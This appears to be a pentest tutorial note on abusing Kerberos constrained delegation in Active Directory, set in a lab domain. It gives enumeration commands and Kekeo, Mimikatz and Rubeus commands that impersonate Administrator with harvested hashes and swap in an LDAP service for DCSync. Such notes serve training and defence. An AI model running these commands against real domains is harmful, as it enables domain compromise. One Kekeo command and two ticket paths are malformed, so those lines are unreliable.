# Constrained Delegation

Kerberos Delegation allows to "reuse the end-user credentials to access resources hosted on a different server". This is typically useful in multi-tier service or applications where Kerberos Double Hop is required.

For example, users authenticates to a web server and web server makes requests to a database server. The web server can request access to resources (all or some resources depending on the type of delegation) on the database server as the user and not as the web server's service account.

Please note that, for the above example, the service account for web service must be trusted for delegation to be able to make requests as a user.

There are two types of Kerberos Delegation:

- General/Basic or Unconstrained Delegation - This allows the first hop server to request access to any service on any computer in the domain
- Constrained Delegation - This allows the first hop server to request access only to specified services on specified computers.

A typical scenario where constrained delegation is used - A user authenticates to a web service without using Kerberos and the web service makes requests to a database server to fetch results based on the user's authorization.

To impersonate the user, Service for User (S4U) extension is used which provides two extensions:

- Service for User to Self (S4U2self) - Allows a service to obtain a forwardable TGS to itself on behalf of a user.
- Service for User to Proxy (S4U2proxy) - Allows a service to obtain a TGS to a second service on behalf of a user.

**Note**: If a user is marked as `Account is sensitive and cannot be delegated` in AD, you will not be able to impersonate them.

This means that if you compromise the hash of the service you can impersonate users and obtain access on their behalf to the service configured (possible privesc).  Also, you won't only have access to the service that user is able to impersonate, but also to any service that uses the same account as the allowed one (because the SPN is not being checked, only privileges). 

For example, if you have access to CIFS service you can also have access to HOST service.
Moreover, notice that if you have access to LDAP service on DC, you will have enough privileges to exploit a DCSync.

## PowerView

Enumerating users with constrained delegation

```powershell
# This will print out the full details of the Users
Get-DomainUser -TrustedToAuth

# Simplified Output
Get-DomainUser -TrustedToAuth | select userprincipalname
```

Enumerating computers with constrained delegation

```powershell
# This will print out the full details of the Computers
Get-DomainComputer -TrustedToAuth

# Simplified Output
Get-DomainComputer -TrustedToAuth | select samaccountname
```

## Active Directory Module

To enumerate Users and Computers with Constrained Delegation

```powershell
# This will print out a list of User and Computer objects with Constrained Delegation
Get-ADObject -Filter {msDs-AllowedtoDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo
```

## Request User TGT and TGS

### Kekeo + Mimikatz

The first approach that we will take is using Kekeo using the NTLM hash that we have previously gathered for this user.  

```powershell
# Launch Kekeo
.\kekeo\x64\kekeo.exe

# Obtain a TGT for the Constrained User
kekeo # tgt::ask /user:websvc /domain:dollarcorp.moneycorp.local /rc4:cc098f204c5887eaa8253e7c2749156f

# Get a TGS for the allowed service using the previously received TGT
kekeo # tgs::s4u /tgt:TGT_websvc@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL.kirbi /user:Administrator@dollarcorp.moneycorp.local /service:cifs/dcorp-mssql.dollarcorp.moneycorp.local
```

Now that we have the TGS, we need to PTT using `Invoke-Mimikatz`

```powershell
Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_cifs~dcor
p-mssql.dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL.kirbi"'
```

### Rubeus

```powershell
.\Rubeus.exe s4u /user:websvc /rc4:cc098f204c5887eaa8253e7c2749156f /impersonateuser:administrator /msdsspn:"cifs/dcorp-mssql.dollarcorp.moneycorp.local" /ptt
```

## Request Computer TGT and TGS

### Kekeo + Mimikatz

This type of attack is different in that with the machine account ,since there is no SNAME validation we can request for SPN on other machines gives us even greater areas to exploit.

```powershell
# Launch Kekeo
.\kekeo\x64\kekeo.exe

# Obtain a TGT for the Constrained Computer
kekeo # tgt::ask /user:dcorp-adminsrv$ /domain:dollarcorp.moneycorp.local /rc4:5e77978a734e3a7f3895fb0fdbda3b96

# Get a TGS for the allowed service using the previously received TGT including another Service
kekeo # tgs::s4u /adminsrv$@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL.kirbi /user:Administrator@dollarcorp.moneycorp.local/service:time/dcorp-dc.dollarcorp.moneycorp.LOCAL|ldap/dcorp-dc.dollarcorp.moneycorp.LOCAL
```
Note that in the above command we have added in another SPN which is for LDAP so that we can do a DCSync attack

We then do a PTT attack with Mimikatz

```powershell
Invoke-Mimikatz -Command '"kerberos::ptt TGS_administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_d
corp-adminsrv$@DOLLARCORP.MONEYCORP.LOCAL.kirbi"'
```
### Rubeus

Note the use of `/altservice` which specifies the additional attack vector

```powershell
.\Rubeus.exe s4u /user:dcorp-adminsrv$ /rc4:5e77978a734e3a7f3895fb0fdbda3b96 /impersonateuser:administrator /msdsspn:"time/dcorp-dc.dollarcorp.moneycorp.local" /altservice:ldap /ptt
```
